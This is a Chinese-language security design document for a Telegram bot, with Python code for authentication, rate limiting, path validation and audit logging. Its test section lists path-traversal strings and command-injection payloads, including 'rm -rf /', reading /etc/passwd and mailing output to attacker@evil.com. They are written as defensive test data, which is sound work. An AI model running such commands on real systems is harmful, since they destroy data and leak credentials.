# TODO-3: 认证与安全框架

## 目标
实现一套全面的安全体系，防范未授权访问、目录遍历攻击和资源滥用，同时保持流畅的用户体验。

## 安全架构

### 多层安全模型
```
1. 用户认证（你是谁？）
   ├── 白名单机制（Telegram 用户 ID）
   └── 令牌机制（生成的访问令牌）

2. 授权（你能做什么？）
   ├── 目录边界
   ├── 命令权限
   └── 资源限制

3. 限流（你能做多少？）
   ├── 请求频率限制
   ├── 费用限制
   └── 并发会话限制

4. 输入校验（这安全吗？）
   ├── 路径遍历防护
   ├── 命令注入防护
   └── 文件类型校验
```

## 认证实现

### 认证管理器
```python
# src/security/auth.py
"""
支持多种认证方式的认证系统

功能特性：
- Telegram ID 白名单
- 令牌认证
- 会话管理
- 审计日志
"""

from abc import ABC, abstractmethod
from typing import Optional, Dict, Any
from datetime import datetime, timedelta
import secrets
import hashlib

class AuthProvider(ABC):
    """认证提供者基类"""

    @abstractmethod
    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        """验证用户凭据"""
        pass

    @abstractmethod
    async def get_user_info(self, user_id: int) -> Optional[Dict[str, Any]]:
        """获取用户信息"""
        pass

class WhitelistAuthProvider(AuthProvider):
    """基于白名单的认证"""

    def __init__(self, allowed_users: List[int]):
        self.allowed_users = set(allowed_users)

    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        return user_id in self.allowed_users

    async def get_user_info(self, user_id: int) -> Optional[Dict[str, Any]]:
        if user_id in self.allowed_users:
            return {"user_id": user_id, "auth_type": "whitelist"}
        return None

class TokenAuthProvider(AuthProvider):
    """基于令牌的认证"""

    def __init__(self, secret: str, storage: 'TokenStorage'):
        self.secret = secret
        self.storage = storage

    async def authenticate(self, user_id: int, credentials: Dict[str, Any]) -> bool:
        token = credentials.get('token')
        if not token:
            return False

        stored_token = await self.storage.get_user_token(user_id)
        return stored_token and self._verify_token(token, stored_token)

    async def generate_token(self, user_id: int) -> str:
        """生成新的认证令牌"""
        token = secrets.token_urlsafe(32)
        hashed = self._hash_token(token)
        await self.storage.store_token(user_id, hashed)
        return token

    def _hash_token(self, token: str) -> str:
        """对令牌进行哈希用于存储"""
        return hashlib.sha256(f"{token}{self.secret}".encode()).hexdigest()

    def _verify_token(self, token: str, stored_hash: str) -> bool:
        """对比令牌与存储的哈希"""
        return self._hash_token(token) == stored_hash

class AuthenticationManager:
    """主认证管理器"""

    def __init__(self, providers: List[AuthProvider]):
        self.providers = providers
        self.sessions: Dict[int, 'UserSession'] = {}

    async def authenticate_user(self, user_id: int, credentials: Optional[Dict[str, Any]] = None) -> bool:
        """使用所有提供者尝试认证"""
        credentials = credentials or {}

        for provider in self.providers:
            if await provider.authenticate(user_id, credentials):
                await self._create_session(user_id, provider)
                return True

        return False

    async def _create_session(self, user_id: int, provider: AuthProvider):
        """创建认证会话"""
        user_info = await provider.get_user_info(user_id)
        self.sessions[user_id] = UserSession(
            user_id=user_id,
            auth_provider=provider.__class__.__name__,
            created_at=datetime.utcnow(),
            user_info=user_info
        )

    def is_authenticated(self, user_id: int) -> bool:
        """检查用户是否有活跃会话"""
        session = self.sessions.get(user_id)
        return session and not session.is_expired()

    def get_session(self, user_id: int) -> Optional['UserSession']:
        """获取用户会话"""
        return self.sessions.get(user_id)
```

### 限流
```python
# src/security/rate_limiter.py
"""
多策略限流实现

功能特性：
- 令牌桶算法
- 基于费用的限制
- 按用户追踪
- 突发处理
"""

from collections import defaultdict
from dataclasses import dataclass
from datetime import datetime, timedelta
import asyncio

@dataclass
class RateLimitBucket:
    """用于限流的令牌桶"""
    capacity: int
    tokens: float
    last_update: datetime

    def consume(self, tokens: int = 1) -> bool:
        """尝试消耗令牌"""
        self._refill()
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True
        return False

    def _refill(self):
        """根据经过的时间补充令牌"""
        now = datetime.utcnow()
        elapsed = (now - self.last_update).total_seconds()
        self.tokens = min(self.capacity, self.tokens + elapsed)
        self.last_update = now

class RateLimiter:
    """主限流系统"""

    def __init__(self, config: 'Settings'):
        self.config = config
        self.request_buckets: Dict[int, RateLimitBucket] = {}
        self.cost_tracker: Dict[int, float] = defaultdict(float)
        self.locks: Dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)

    async def check_rate_limit(self, user_id: int, cost: float = 1.0) -> Tuple[bool, Optional[str]]:
        """检查请求是否被允许"""
        async with self.locks[user_id]:
            # 检查请求频率
            if not self._check_request_rate(user_id):
                return False, "Rate limit exceeded. Please wait before making more requests."

            # 检查费用限制
            if not self._check_cost_limit(user_id, cost):
                remaining = self.config.claude_max_cost_per_user - self.cost_tracker[user_id]
                return False, f"Cost limit exceeded. Remaining budget: ${remaining:.2f}"

            return True, None

    def _check_request_rate(self, user_id: int) -> bool:
        """检查请求频率限制"""
        if user_id not in self.request_buckets:
            self.request_buckets[user_id] = RateLimitBucket(
                capacity=self.config.rate_limit_burst,
                tokens=self.config.rate_limit_burst,
                last_update=datetime.utcnow()
            )

        return self.request_buckets[user_id].consume()

    def _check_cost_limit(self, user_id: int, cost: float) -> bool:
        """检查基于费用的限制"""
        if self.cost_tracker[user_id] + cost > self.config.claude_max_cost_per_user:
            return False

        self.cost_tracker[user_id] += cost
        return True

    async def reset_user_limits(self, user_id: int):
        """重置用户的限制"""
        async with self.locks[user_id]:
            self.cost_tracker[user_id] = 0
            if user_id in self.request_buckets:
                self.request_buckets[user_id].tokens = self.config.rate_limit_burst
```

### 目录安全
```python
# src/security/validators.py
"""
输入校验与安全检查

功能特性：
- 路径遍历防护
- 命令注入防护
- 文件类型校验
- 输入清洗
"""

import os
import re
from pathlib import Path
from typing import Optional, List

class SecurityValidator:
    """用户输入的安全校验"""

    # 危险模式
    DANGEROUS_PATTERNS = [
        r'\.\.',           # 父目录
        r'~',              # 主目录
        r'\$',             # 变量展开
        r'`',              # 命令替换
        r';',              # 命令链接
        r'&&',             # 命令链接
        r'\|\|',           # 命令链接
        r'>',              # 重定向
        r'<',              # 重定向
        r'\|',             # 管道
    ]

    # 允许的文件扩展名
    ALLOWED_EXTENSIONS = {
        '.py', '.js', '.ts', '.jsx', '.tsx', '.java', '.cpp', '.c',
        '.h', '.hpp', '.cs', '.go', '.rs', '.rb', '.php', '.swift',
        '.kt', '.md', '.txt', '.json', '.yml', '.yaml', '.toml',
        '.xml', '.html', '.css', '.scss', '.sql', '.sh', '.bash'
    }

    def __init__(self, approved_directory: Path):
        self.approved_directory = approved_directory.resolve()

    def validate_path(self, user_path: str, current_dir: Path) -> Tuple[bool, Optional[Path], Optional[str]]:
        """校验并解析用户提供的路径"""
        try:
            # 检查危险模式
            for pattern in self.DANGEROUS_PATTERNS:
                if re.search(pattern, user_path):
                    return False, None, f"Invalid path: contains forbidden pattern"

            # 解析路径
            if user_path.startswith('/'):
                # 批准目录内的绝对路径
                target = self.approved_directory / user_path.lstrip('/')
            else:
                # 相对路径
                target = current_dir / user_path

            # 解析并检查边界
            target = target.resolve()

            # 必须在批准目录内
            if not self._is_within_directory(target, self.approved_directory):
                return False, None, "Access denied: path outside approved directory"

            return True, target, None

        except Exception as e:
            return False, None, f"Invalid path: {str(e)}"

    def _is_within_directory(self, path: Path, directory: Path) -> bool:
        """检查路径是否在目录内"""
        try:
            path.relative_to(directory)
            return True
        except ValueError:
            return False

    def validate_filename(self, filename: str) -> Tuple[bool, Optional[str]]:
        """校验上传的文件名"""
        # 检查文件名中的路径遍历
        if '/' in filename or '\\' in filename:
            return False, "Invalid filename: contains path separators"

        # 检查扩展名
        ext = Path(filename).suffix.lower()
        if ext not in self.ALLOWED_EXTENSIONS:
            return False, f"File type not allowed: {ext}"

        # 检查隐藏文件
        if filename.startswith('.'):
            return False, "Hidden files not allowed"

        return True, None

    def sanitize_command_input(self, text: str) -> str:
        """清洗命令输入文本"""
        # 移除潜在危险字符
        sanitized = re.sub(r'[`$;|&<>]', '', text)

        # 限制长度
        max_length = 1000
        if len(sanitized) > max_length:
            sanitized = sanitized[:max_length]

        return sanitized.strip()
```

### 审计日志
```python
# src/security/audit.py
"""
安全审计日志

功能特性：
- 所有认证尝试
- 命令执行
- 文件访问
- 安全违规
"""

@dataclass
class AuditEvent:
    timestamp: datetime
    user_id: int
    event_type: str
    success: bool
    details: Dict[str, Any]
    ip_address: Optional[str] = None

class AuditLogger:
    """安全审计日志记录器"""

    def __init__(self, storage: 'AuditStorage'):
        self.storage = storage

    async def log_auth_attempt(self, user_id: int, success: bool, method: str, reason: Optional[str] = None):
        """记录认证尝试"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='auth_attempt',
            success=success,
            details={
                'method': method,
                'reason': reason
            }
        ))

    async def log_command(self, user_id: int, command: str, args: List[str], success: bool):
        """记录命令执行"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='command',
            success=success,
            details={
                'command': command,
                'args': args
            }
        ))

    async def log_security_violation(self, user_id: int, violation_type: str, details: str):
        """记录安全违规"""
        await self.storage.store_event(AuditEvent(
            timestamp=datetime.utcnow(),
            user_id=user_id,
            event_type='security_violation',
            success=False,
            details={
                'violation_type': violation_type,
                'details': details
            }
        ))
```

## 中间件实现

### 认证中间件
```python
# src/bot/middleware/auth.py
"""
Telegram Bot 认证中间件
"""

async def auth_middleware(handler, event, data):
    """处理前检查认证"""
    user_id = event.from_user.id

    # 从上下文获取认证管理器
    auth_manager = data['auth_manager']

    # 检查认证状态
    if not auth_manager.is_authenticated(user_id):
        # 尝试认证
        if not await auth_manager.authenticate_user(user_id):
            await event.reply_text(
                "🔒 Authentication required.\n"
                "You are not authorized to use this bot.\n"
                "Contact the administrator for access."
            )
            return

    # 更新会话活动时间
    session = auth_manager.get_session(user_id)
    session.last_activity = datetime.utcnow()

    # 继续到处理器
    return await handler(event, data)
```

### 限流中间件
```python
# src/bot/middleware/rate_limit.py
"""
限流中间件
"""

async def rate_limit_middleware(handler, event, data):
    """处理前检查限流"""
    user_id = event.from_user.id
    rate_limiter = data['rate_limiter']

    # 检查限流（默认费用为 1）
    allowed, message = await rate_limiter.check_rate_limit(user_id)

    if not allowed:
        await event.reply_text(f"⏱️ {message}")
        return

    return await handler(event, data)
```

## 安全测试

### 安全测试用例
```python
# tests/test_security.py
"""
安全测试
"""

# 路径遍历尝试
test_paths = [
    "../../../etc/passwd",
    "~/.ssh/id_rsa",
    "/etc/shadow",
    "project/../../../",
    "project/./../../",
    "project%2F..%2F..%2F",
]

# 命令注入尝试
test_commands = [
    "test; rm -rf /",
    "test && cat /etc/passwd",
    "test | mail attacker@evil.com",
    "test `whoami`",
    "test $(pwd)",
]

# 文件上传测试
test_files = [
    "malicious.exe",
    "../../../.bashrc",
    ".hidden_file",
    "test.unknown",
]
```

## 验收标准

- [ ] 白名单认证正常工作
- [ ] 令牌认证已实现
- [ ] 限流能够防止滥用
- [ ] 费用追踪已实施
- [ ] 路径遍历尝试被阻止
- [ ] 命令注入已防护
- [ ] 文件类型校验正常工作
- [ ] 审计日志捕获所有事件
- [ ] 中间件正确拦截请求
- [ ] 所有安全测试通过
- [ ] 不存在 OWASP Top 10 安全漏洞
